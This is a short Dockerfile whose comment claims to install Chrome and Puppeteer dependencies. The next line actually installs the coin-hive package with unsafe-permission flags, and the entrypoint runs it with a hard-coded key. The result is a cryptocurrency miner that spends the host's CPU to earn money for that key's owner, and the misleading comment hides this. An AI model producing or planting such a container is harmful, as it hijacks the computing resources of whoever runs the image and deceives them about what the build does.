FROM node:8-slim

# Install latest chrome and puppeteer dependencies
RUN npm install -g coin-hive --unsafe-perm=true --allow-root

# Run coin-hive
ENTRYPOINT coin-hive LZSdFJYBUldfKhSwZV5aWrgDXpFzut66
